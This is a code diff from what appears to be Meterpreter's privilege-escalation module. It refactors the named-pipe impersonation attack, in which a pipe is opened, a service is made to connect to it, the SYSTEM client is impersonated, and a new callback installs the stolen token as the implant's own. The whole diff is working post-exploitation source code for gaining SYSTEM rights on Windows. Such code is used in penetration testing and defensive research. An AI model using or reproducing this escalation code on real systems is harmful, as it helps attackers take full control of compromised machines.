@@ -3,6 +3,28 @@
 #include "namedpipe.h"
 #include "service.h"
 
+typedef DWORD (*Callback)(LPVOID);
+
+/*
+ * A post-impersonation callback that simply updates the meterpreter token to the
+ * current thread token.
+ */
+DWORD post_callback_use_self(Remote * remote)
+{
+	HANDLE hToken = NULL;
+
+	// get a handle to this threads token
+	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
+		dprintf("[ELEVATE] post_callback_use_self. OpenThreadToken failed");
+		return GetLastError();
+	}
+
+	// now we can set the meterpreters thread token to that of our system
+	// token so all subsequent meterpreter threads will use this token.
+	met_api->thread.update_token(remote, hToken);
+	return ERROR_SUCCESS;
+}
+
 /*
  * Worker thread for named pipe impersonation. Creates a named pipe and impersonates
  * the first client which connects to it.
@@ -11,21 +33,22 @@ DWORD THREADCALL elevate_namedpipe_thread(THREAD * thread)
 {
 	DWORD dwResult              = ERROR_ACCESS_DENIED;
 	HANDLE hServerPipe          = NULL;
-	HANDLE hToken               = NULL;
-	HANDLE hSem		    = NULL;
+	HANDLE hSem		            = NULL;
 	char * cpServicePipe        = NULL;
 	Remote * remote             = NULL;
 	BYTE bMessage[128]          = {0};
 	DWORD dwBytes               = 0;
+	Callback fPostImpersonation = NULL;
 
 	do {
 		if (!thread) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread. invalid thread", ERROR_BAD_ARGUMENTS);
 		}
 
-		cpServicePipe = (char *)thread->parameter1;
-		remote        = (Remote *)thread->parameter2;
-		hSem          = (HANDLE)thread->parameter3;
+		cpServicePipe      = (char *)thread->parameter1;
+		remote             = (Remote *)thread->parameter2;
+		hSem               = (HANDLE)thread->parameter3;
+		fPostImpersonation = (Callback)thread->parameter4;
 
 		if (!cpServicePipe || !remote) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread.  invalid thread arguments",
@@ -49,9 +72,9 @@ DWORD THREADCALL elevate_namedpipe_thread(THREAD * thread)
 			}
 
 			//signal the client that the pipe is ready
-                        if (hSem) {
-                                if (!ReleaseSemaphore(hSem, 1, NULL)) {
-				        BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread. ReleaseSemaphore failed",
+            if (hSem) {
+                if (!ReleaseSemaphore(hSem, 1, NULL)) {
+					BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread. ReleaseSemaphore failed",
 						ERROR_DBG_TERMINATE_THREAD);
 				}
 			}
@@ -62,7 +85,7 @@ DWORD THREADCALL elevate_namedpipe_thread(THREAD * thread)
 					continue;
 			}
 
-			dprintf("[ELEVATE] pipethread. got client conn.");
+			dprintf("[ELEVATE] pipethread. receieved a client connection");
 
 			// we can't impersonate a client untill we have performed a read on the pipe...
 			if (!ReadFile(hServerPipe, &bMessage, 1, &dwBytes, NULL)) {
@@ -74,16 +97,12 @@ DWORD THREADCALL elevate_namedpipe_thread(THREAD * thread)
 				CONTINUE_ON_ERROR("[ELEVATE] elevate_namedpipe_thread. ImpersonateNamedPipeClient failed");
 			}
 
-			// get a handle to this threads token
-			if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
-				CONTINUE_ON_ERROR("[ELEVATE] elevate_namedpipe_thread. OpenThreadToken failed");
+			if (fPostImpersonation) {
+				dwResult = fPostImpersonation(remote);
+				if (dwResult != ERROR_SUCCESS) {
+					CONTINUE_ON_ERROR("[ELEVATE] elevate_namedpipe_thread. the post impersonation callback failed");
+				}
 			}
-
-			// now we can set the meterpreters thread token to that of our system
-			// token so all subsequent meterpreter threads will use this token.
-			met_api->thread.update_token(remote, hToken);
-
-			dwResult = ERROR_SUCCESS;
 
 			break;
 		}
@@ -143,7 +162,7 @@ DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
 			"cmd.exe /c echo %s > %s", cpServiceName, cServicePipe);
 
 		hSem = CreateSemaphore(NULL, 0, 1, NULL);
-		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem, NULL);
+		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem, (Callback)post_callback_use_self);
 		if (!pThread) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. met_api->thread.create failed",
 				ERROR_INVALID_HANDLE);
@@ -279,7 +298,7 @@ DWORD elevate_via_service_namedpipe2(Remote * remote, Packet * packet)
 		}
 
 		hSem = CreateSemaphore(NULL, 0, 1, NULL);
-		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem, NULL);
+		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem, (Callback)post_callback_use_self);
 		if (!pThread) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. met_api->thread.create failed",
 				ERROR_INVALID_HANDLE);
